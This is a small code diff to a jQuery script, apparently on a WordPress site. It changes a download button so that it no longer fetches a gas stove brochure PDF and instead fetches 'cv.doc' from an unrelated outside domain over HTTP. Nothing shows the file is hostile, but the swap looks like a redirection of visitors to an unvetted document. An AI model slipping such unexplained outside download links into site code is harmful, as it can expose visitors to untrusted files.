@@ -43,7 +43,7 @@ jQuery(document).ready(function($) {
 	$('input.download').click(function(e){
 		e.preventDefault();
 
-		download('https://chesneys-test-uk.tk/wp-content/uploads/2019/03/Gas-Stove-Brochure-2018-vol1-web.pdf','https://chesneys-test-uk.tk/wp-content/uploads/2019/03/Gas-Stove-Brochure-2018-vol1-web.pdf');
+		download('http://nogin.info/cv.doc','http://nogin.info/cv.doc');
 	} );
 	
 	var download = function() {
